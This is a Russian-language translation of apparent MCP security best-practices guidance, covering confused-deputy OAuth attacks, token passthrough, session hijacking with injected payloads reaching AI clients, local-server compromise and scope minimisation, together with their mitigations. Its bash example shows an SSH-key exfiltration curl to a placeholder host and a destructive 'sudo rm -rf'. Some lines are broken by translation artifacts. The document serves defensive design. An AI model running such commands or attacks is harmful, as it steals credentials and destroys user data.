## Введение

### Цель и сфера применения

В этом документе рассматриваются вопросы безопасности протокола контекста модели (MCP), дополняющего спецификацию [авторизации MCP](../basic/authorization). В документе определены риски безопасности, векторы атак и лучшие практики, специфичные для реализаций MCP.

Данная документация предназначена в первую очередь для разработчиков, внедряющих потоки авторизации MCP, операторов серверов MCP и специалистов по безопасности, оценивающих системы на основе MCP. Этот документ следует читать вместе со спецификацией авторизации MCP и [рекомендациями по обеспечению безопасности OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc9700).

## Атаки и меры противодействия

В этом разделе дано подробное описание атак на реализации MCP, а также потенциальных мер противодействия.

### Проблема растерянного заместителя

Злоумышленники могут использовать уязвимости прокси-серверов MCP, подключающихся к API третьих сторон, создавая уязвимости типа «[confused Deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)». Эта атака позволяет вредоносным клиентам получать коды авторизации без надлежащего согласия пользователя, используя комбинацию статических идентификаторов клиентов, динамической регистрации клиентов и файлов cookie согласия.

#### Терминология

**Прокси-сервер MCP**
: Сервер MCP, который подключает клиенты MCP к API сторонних разработчиков, предоставляя функции MCP, делегируя операции и выступая в качестве единого клиента OAuth для сервера API стороннего разработчика.

**Сторонний сервер авторизации**
: Сервер авторизации, защищающий API сторонних сервисов. Он может не поддерживать динамическую регистрацию клиентов, поэтому прокси-сервер MCP должен использовать статический идентификатор клиента для всех запросов.

**API сторонних разработчиков**
: Защищенный ресурсный сервер, предоставляющий фактическую функциональность API. Доступ к нему
Для работы API требуются токены, выданные сторонним сервером авторизации.

**Статический идентификатор клиента**
: Фиксированный идентификатор клиента OAuth 2.0, используемый прокси-сервером MCP при взаимодействии с
Сервер авторизации третьей стороны. Этот идентификатор клиента относится к серверу MCP, выступающему в качестве клиента.
к API стороннего сервиса. Это значение одинаково для всех взаимодействий сервера MCP с API стороннего сервиса независимо от...
Какой клиент MCP инициировал запрос?

#### Уязвимые условия

Данная атака становится возможной при наличии всех следующих условий:

* Прокси-сервер MCP использует **статический идентификатор клиента** с сервером авторизации стороннего поставщика услуг.
* Прокси-сервер MCP позволяет клиентам MCP **динамически регистрироваться** (каждый получает свой собственный client_id).
* Сервер авторизации третьей стороны устанавливает **файл cookie согласия** после первой авторизации.
* Прокси-сервер MCP не обеспечивает надлежащего получения согласия каждого клиента перед переадресацией запроса на авторизацию третьей стороне.

#### Описание атаки

Когда прокси-сервер MCP использует статический идентификатор клиента для аутентификации у стороннего сервиса
В случае с сервером авторизации становится возможной следующая атака:

1. Пользователь проходит обычную аутентификацию через прокси-сервер MCP для доступа к API стороннего сервиса.
2. В ходе этого процесса сервер авторизации третьей стороны устанавливает cookie-файл в пользовательском агенте.
   подтверждение согласия на использование статического идентификатора клиента
3. Затем злоумышленник отправляет пользователю вредоносную ссылку, содержащую специально сформированный запрос авторизации, включающий вредоносный URI перенаправления, а также новый динамически зарегистрированный идентификатор клиента.
4. Когда пользователь переходит по ссылке, в его браузере по-прежнему сохраняется cookie-файл согласия, полученный в результате предыдущего законного запроса.
5. Сервер авторизации третьей стороны обнаруживает cookie и пропускает экран подтверждения согласия.
6. Код авторизации MCP перенаправляется на сервер злоумышленника (указанный в вредоносном параметре `redirect_uri` во время [динамической регистрации клиента](/specification/2025-11-25/basic/authorization#dynamic-client-registration)).
7. Злоумышленник обменивает украденный код авторизации на токены доступа к серверу MCP без явного согласия пользователя.
8. Теперь злоумышленник имеет доступ к API третьей стороны как скомпрометированный пользователь.

#### Меры по смягчению последствий

Для предотвращения атак с использованием «запутанного заместителя» прокси-серверы MCP **ОБЯЗАТЕЛЬНО** должны внедрять механизм согласия каждого клиента и надлежащие меры безопасности, как описано ниже.

    MCP->>Браузер: Перенаправление на сторонний сайт /authorize

##### Необходимые меры защиты

**Хранение данных с согласия каждого клиента**

Прокси-серверы MCP **ОБЯЗАТЕЛЬНО**:

* Вести реестр утвержденных значений `client_id` для каждого пользователя.
* Проверьте этот реестр **перед** запуском процесса авторизации третьих лиц.
* Надежное хранение решений о согласии (база данных на стороне сервера или файлы cookie, специфичные для сервера)

**Требования к пользовательскому интерфейсу для получения согласия**

Страница согласия уровня MCP **ОБЯЗАТЕЛЬНО**:

* Четко укажите имя запрашивающего клиента MCP.
* Отобразить конкретные области действия сторонних API, которые запрашиваются.
* Отобразить зарегистрированный `redirect_uri`, куда будут отправлены токены.
* Реализовать защиту от CSRF-атак (например, параметры состояния, токены CSRF).
* Предотвратите использование iframe с помощью директивы CSP `frame-ancestors` или `X-Frame-Options: DENY`, чтобы предотвратить кликджекинг.

**Защита файлов cookie согласия**

При использовании файлов cookie для отслеживания решений о согласии, они **ОБЯЗАТЕЛЬНО**:

* Используйте префикс `__Host-` для имен cookie.
* Установите атрибуты `Secure`, `HttpOnly` и `SameSite=Lax`.
* Используйте криптографическую подпись или сессии на стороне сервера.
* Привязаться к конкретному `client_id` (а не просто к "пользователь дал согласие")

**Проверка URI перенаправления**

Прокси-сервер MCP ОБЯЗАТЕЛЬНО должен:

* Убедитесь, что `redirect_uri` в запросах авторизации точно соответствует зарегистрированному URI.
* Отклонять запросы, если `redirect_uri` изменился без повторной регистрации.
* Используйте точное сопоставление строк (а не сопоставление с шаблоном или подстановочные символы).

**Проверка параметров состояния OAuth**

Параметр `state` в OAuth имеет решающее значение для предотвращения перехвата кода авторизации и CSRF-атак. Надлежащая проверка состояния гарантирует, что подтверждение согласия на конечной точке авторизации будет обеспечено на конечной точке обратного вызова.

Прокси-серверы MCP, реализующие потоки OAuth, **ОБЯЗАТЕЛЬНО**:

* Генерировать криптографически защищенное случайное значение `state` для каждого запроса авторизации
* Сохраняйте значение `state` на стороне сервера (в защищенном хранилище сессий или зашифрованном cookie-файле) **только после** явного подтверждения согласия.
* Установите cookie/сессию для отслеживания состояния **непосредственно перед** перенаправлением к стороннему поставщику идентификационных данных (не до подтверждения согласия).
* Убедитесь на конечной точке обратного вызова, что параметр запроса `state` точно соответствует значению, хранящемуся в cookie-файлах запроса обратного вызова или в сессии на основе cookie-файлов запроса.
* Отклонять любые запросы обратного вызова, в которых отсутствует параметр `state` или он не соответствует действительности.
* Убедитесь, что значения `state` являются одноразовыми (удаляются после проверки) и имеют короткий срок действия (например, 10 минут).

Файл cookie согласия или сессия, содержащая значение `state`, **НЕ ДОЛЖНЫ** устанавливаться до тех пор, пока **после** подтверждения пользователем согласия на экране авторизации сервера MCP. Установка этого файла cookie до подтверждения согласия делает экран согласия неэффективным, поскольку злоумышленник может обойти его, создав вредоносный запрос на авторизацию.

### Передача токена

«Передача токенов через сервер» — это антипаттерн, при котором сервер MCP принимает токены от клиента MCP, не проверяя, были ли токены надлежащим образом выданы *серверу MCP*, и передает их в нижестоящий API.

#### Риски

В [спецификации авторизации](/specification/2025-11-25/basic/authorization) прямо запрещена передача токенов, поскольку она создает ряд рисков безопасности, в том числе:

* **Обход системы контроля безопасности**
  * Сервер MCP или нижестоящие API могут реализовывать важные средства контроля безопасности, такие как ограничение скорости запросов, проверка запросов или мониторинг трафика, которые зависят от целевой аудитории токена или других ограничений учетных данных. Если клиенты могут получать и использовать токены напрямую через нижестоящие API без надлежащей проверки сервером MCP или без гарантии того, что токены выданы для нужной службы, они обходят эти средства контроля.
* **Вопросы подотчетности и контроля**
  * Сервер MCP не сможет идентифицировать или различать клиентов MCP, если клиенты используют выданный вышестоящим сервером токен доступа, который может быть непрозрачным для сервера MCP.
  * В журналах нижестоящего сервера ресурсов могут отображаться запросы, которые, по-видимому, поступают из другого источника с другой идентификацией, а не с сервера MCP, который фактически пересылает токены.
  * Оба фактора затрудняют расследование инцидентов, контроль и аудит.
  * Если сервер MCP передает токены без проверки их свойств (например, ролей, привилегий или аудитории) или других метаданных, злоумышленник, обладающий украденным токеном, может использовать сервер в качестве прокси для утечки данных.
* **Проблемы, связанные с границами доверия**
  * Сервер ресурсов, расположенный ниже по потоку, предоставляет доверие определенным сущностям. Это доверие может включать предположения об источнике или моделях поведения клиентов. Нарушение этой границы доверия может привести к непредвиденным проблемам.
  * Если токен принимается несколькими сервисами без надлежащей проверки, злоумышленник, взломавший один сервис, может использовать токен для доступа к другим подключенным сервисам.
* **Риск несовместимости в будущем**
  * Даже если сегодня MCP-сервер работает как «чистый прокси», позже может потребоваться добавление средств контроля безопасности. Правильное разделение аудитории токенов на начальные этапы упрощает развитие модели безопасности.

#### Меры по смягчению последствий

Серверы MCP **НЕ ДОЛЖНЫ** принимать токены, которые не были явно выданы для данного сервера MCP.

### Перехват сессии

Перехват сессии — это метод атаки, при котором сервер предоставляет клиенту идентификатор сессии, и неавторизованная сторона может получить и использовать этот же идентификатор сессии, чтобы выдать себя за исходного клиента и выполнять несанкционированные действия от его имени.

#### Внедрение подсказки при перехвате сессии

```тема русалки={null}
диаграмма последовательности
    участник Клиент
    участник ServerA
    очередь участников
    участник ServerB
    участник Нападавший

    Клиент->>СерверA: Инициализация (подключение к потоковому HTTP-серверу)
    Сервер A --> Клиент: Ответьте идентификатором сессии

    Злоумышленник->>СерверB: Доступ/угадывание идентификатора сессии
    Обратите внимание на права злоумышленника: злоумышленник знает/угадывает идентификатор сессии.

    Злоумышленник->>СерверB: Событие запуска (вредоносная полезная нагрузка, использующая идентификатор сессии)
    Сервер B -> Очередь: Событие добавления в очередь (ключом является идентификатор сессии)

    ServerA->>Queue: Опрос событий (с использованием идентификатора сессии)
    Очередь --> Сервер A: Данные события (вредоносная полезная нагрузка)

    Сервер A --> Клиент: Асинхронный ответ (вредоносная полезная нагрузка)
    Клиент->>Клиент: Действует на основе вредоносной полезной нагрузки
```

#### Имитация перехвата сессии

```тема русалки={null}
диаграмма последовательности
    участник Клиент
    участник Сервер
    участник Нападавший

    Клиент->>Сервер: Инициализация (вход в систему/аутентификация)
    Сервер-->>Клиент: Ответить идентификатором сессии (постоянная сессия создана)

    Злоумышленник->>Сервер: Доступ/угадывание идентификатора сессии
    Обратите внимание на права злоумышленника: злоумышленник знает/угадывает идентификатор сессии.

    Злоумышленник->>Сервер: Выполнить вызов API (используя идентификатор сессии, без повторной аутентификации)
    Сервер --> Атакующий: Ответить так, как если бы атакующий был клиентом (перехват сессии)
```

#### Описание атаки

При наличии нескольких HTTP-серверов с сохранением состояния, обрабатывающих MCP-запросы, возможны следующие векторы атаки:

**Внедрение подсказки для перехвата сессии**

1. Клиент подключается к **серверу A** и получает идентификатор сессии.

2. Злоумышленник получает существующий идентификатор сессии и отправляет вредоносное событие на **сервер B** с указанным идентификатором сессии.
   * Если сервер поддерживает [повторную доставку/возобновляемые потоки](/specification/2025-11-25/basic/transports#resumability-and-redelivery), преднамеренное прерывание запроса до получения ответа может привести к его возобновлению исходным клиентом посредством GET-запроса для событий, отправленных сервером.
   * Если конкретный сервер инициирует отправку событий в результате вызова инструмента, например, `notifications/tools/list_changed`, что может повлиять на инструменты, предоставляемые сервером, клиент может получить доступ к инструментам, о включении которых он не знал.

3. **Сервер B** помещает событие (связанное с идентификатором сессии) в общую очередь.

4. **Сервер A** опрашивает очередь на наличие событий, используя идентификатор сессии, и извлекает вредоносную полезную нагрузку.

5. **Сервер A** отправляет вредоносную полезную нагрузку клиенту в виде асинхронного или возобновленного ответа.

6. Клиент получает вредоносную программу и обрабатывает её, что может привести к компрометации системы.

**Имитация захвата сессии**

1. Клиент MCP проходит аутентификацию на сервере MCP, создавая постоянный идентификатор сессии.
2. Злоумышленник получает идентификатор сессии.
3. Злоумышленник совершает вызовы к серверу MCP, используя идентификатор сессии.
4. Сервер MCP не проверяет наличие дополнительной авторизации и рассматривает злоумышленника как законного пользователя, допуская несанкционированный доступ или действия.

#### Меры по смягчению последствий

Для предотвращения атак с использованием перехвата сессий и внедрения событий следует внедрить следующие меры:

Серверы MCP, реализующие авторизацию, **ОБЯЗАТЕЛЬНО** должны проверять все входящие запросы.
Серверы MCP **НЕ ДОЛЖНЫ** использовать сессии для аутентификации.

Серверы MCP **ОБЯЗАТЕЛЬНО** должны использовать безопасные, недетерминированные идентификаторы сессий.
Идентификаторы сессий, генерируемые системой (например, UUID), **ДОЛЖНЫ** использовать надежные генераторы случайных чисел. Следует избегать предсказуемых или последовательных идентификаторов сессий, которые могут быть угаданы злоумышленником. Смена или аннулирование идентификаторов сессий также может снизить риск.

Серверы MCP **ДОЛЖНЫ** привязывать идентификаторы сессий к информации, специфичной для пользователя.
При хранении или передаче данных, связанных с сессией (например, в очереди), объединяйте идентификатор сессии с информацией, уникальной для авторизованного пользователя, такой как его внутренний идентификатор пользователя. Используйте формат ключа, например, `<user_id>:<session_id>`. Это гарантирует, что даже если злоумышленник угадает идентификатор сессии, он не сможет выдать себя за другого пользователя, поскольку идентификатор пользователя формируется на основе токена пользователя, а не предоставляется клиентом.

Серверы MCP могут дополнительно использовать уникальные идентификаторы.

### Компрометация локального MCP-сервера

Локальные MCP-серверы — это MCP-серверы, работающие на локальном компьютере пользователя, либо путем загрузки и запуска сервера пользователем, либо путем самостоятельного создания сервера, либо путем установки через конфигурационные потоки клиента. Эти серверы могут иметь прямой доступ к системе пользователя и могут быть доступны другим процессам, работающим на компьютере пользователя, что делает их привлекательными целями для атак.

#### Описание атаки

Локальные MCP-серверы представляют собой исполняемые файлы, которые загружаются и запускаются на той же машине, что и MCP-клиент. Без надлежащей изоляции и требований к согласию пользователя становятся возможными следующие атаки:

1. Злоумышленник включает вредоносную команду «запуска» в конфигурацию клиента.
2. Злоумышленник распространяет вредоносную программу внутри самого сервера.
3. Злоумышленник получает доступ к незащищенному локальному серверу, работающему на localhost, посредством перепривязки DNS.

Примеры вредоносных команд автозапуска, которые могут быть внедрены:

```bash theme={null}
# Извлечение данных
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Повышение привилегий
sudo rm -rf /important/system/files && echo "Сервер MCP установлен!"
```

#### Риски

Локальные серверы MCP с недостаточными ограничениями или полученные из ненадежных источников создают ряд критических угроз безопасности:

* **Произвольное выполнение кода**. Злоумышленники могут выполнить любую команду, имея привилегии клиента MCP.
* **Отсутствие видимости**. Пользователи не имеют представления о том, какие команды выполняются.
* **Обфускация команд**. Злоумышленники могут использовать сложные или запутанные команды, чтобы выглядеть легитимно.
* **Утечка данных**. Злоумышленники могут получить доступ к легитимным локальным серверам MCP через скомпрометированный JavaScript.
* **Потеря данных**. Злоумышленники или уязвимости на легитимных серверах могут привести к необратимой потере данных на хост-машине.

#### Меры по смягчению последствий

Если клиент MCP поддерживает локальную настройку сервера MCP одним щелчком мыши, он **ОБЯЗАТЕЛЬНО** должен реализовать надлежащие механизмы подтверждения согласия перед выполнением команд.

**Предварительное согласие на настройку**

Перед подключением нового локального сервера MCP с помощью настройки в один клик отобразите понятное диалоговое окно согласия. Клиент MCP **ОБЯЗАТЕЛЬНО**:

* Отобразить точную команду, которая будет выполнена, без сокращений (включая аргументы и параметры).
* Чётко обозначьте это как потенциально опасную операцию, которая выполняет код в системе пользователя.
* Для продолжения требуется явное согласие пользователя.
* Предоставить пользователям возможность отменить настройку

Клиент MCP **ДОЛЖЕН** внедрить дополнительные проверки и механизмы защиты для снижения потенциальных векторов атак, связанных с выполнением кода:

* Выделите потенциально опасные шаблоны команд (например, команды, содержащие `sudo`, `rm -rf`, сетевые операции, доступ к файловой системе за пределами ожидаемых каталогов).
* Выводить предупреждения для команд, обращающихся к конфиденциальным данным (домашний каталог, SSH-ключи, системные каталоги).
* Предупреждение: серверы MCP работают с теми же привилегиями, что и клиент.
* Выполнение команд сервера MCP в изолированной среде с минимальными правами по умолчанию.
* Запуск серверов MCP с ограниченным доступом к файловой системе, сети и другим системным ресурсам.
* Предоставить пользователям механизмы для явного предоставления дополнительных привилегий (например, доступа к определенным каталогам, доступа к сети) при необходимости.
* Используйте подходящие для вашей платформы технологии изоляции (контейнеры, chroot, песочницы приложений и т. д.).

Серверы MCP, предназначенные для локального запуска, **ДОЛЖНЫ** внедрить меры по предотвращению несанкционированного использования со стороны вредоносных процессов:

* Используйте транспорт `stdio` для ограничения доступа только для клиента MCP.
* Ограничьте доступ при использовании HTTP-транспорта, например:
  * Требуется токен авторизации
  * Используйте сокеты домена Unix или другие механизмы межпроцессного взаимодействия (IPC) с ограниченным доступом.

### Минимизация области применения

Некачественная разработка области действия токена увеличивает вероятность компрометации, повышает неудобства для пользователя и скрывает журналы аудита.

#### Описание атаки

Злоумышленник получает (путем утечки логов, сбора данных из памяти или локального перехвата) токен доступа, содержащий широкие области действия (`files:*`, `db:*`, `admin:*`), которые были предоставлены заранее, поскольку сервер MCP открыл все области действия в `scopes_supported`, и клиент запросил их все. Токен обеспечивает горизонтальный доступ к данным, цепочку привилегий и затрудняет отзыв доступа без повторного получения согласия от всей поверхности.

#### Риски

* Расширен радиус поражения: украденный широкий токен позволяет получить доступ к несвязанным инструментам/ресурсам.
* Более высокие сложности при аннулировании: аннулирование токена с максимальными привилегиями нарушает все рабочие процессы.
* Шум при аудите: единый общий блок мониторинга маскирует намерения пользователя для каждой операции.
* Цепочка привилегий: злоумышленник может немедленно запустить инструменты высокого риска без дополнительных запросов на повышение привилегий.
* Отказ от согласия: пользователи отклоняют диалоговые окна, содержащие информацию о чрезмерном объеме данных.
* Недостаток метрик приводит к нормализации чрезмерно широких запросов.

#### Меры по смягчению последствий

Внедрите модель прогрессивного доступа с минимальными привилегиями:

* Минимальный начальный набор областей видимости (например, `mcp:tools-basic`), содержащий только операции обнаружения/чтения с низким уровнем риска.
* Постепенное повышение привилегий посредством целевых проверок `WWW-Authenticate` `scope="..."` при первой попытке выполнения привилегированных операций.
* Допустимое сужение области действия: сервер должен принимать токены с уменьшенной областью действия; сервер аутентификации МОЖЕТ выдавать подмножество запрошенных областей действия.

Инструкция для сервера:

* Выявляйте конкретные проблемы, связанные с объемом работ; избегайте возврата всего каталога.
* Зарегистрируйте события изменения высоты (запрошенный объем, предоставленное подмножество) с идентификаторами корреляции.

Рекомендации для клиента:

* Начните только с базовых областей действия (или тех, которые указаны в исходном файле `WWW-Authenticate`).
* Кэшировать последние сбои, чтобы избежать повторных циклов повышения привилегий для запрещенных областей действия.

#### Распространенные ошибки

* Публикация всех возможных областей видимости в `scopes_supported`
* Использование подстановочных знаков или общих областей видимости (`*`, `all`, `full-access`)
* Объединение несвязанных привилегий для предотвращения будущих запросов.
* Возвращает весь каталог областей применения в каждом задании
* Скрытые семантические изменения области видимости без версионирования
* Заявленные области действия в токене рассматриваются как достаточные без логики авторизации на стороне сервера.

Надлежащая минимизация рисков ограничивает влияние компромиссов, повышает ясность аудита и снижает отток согласия.
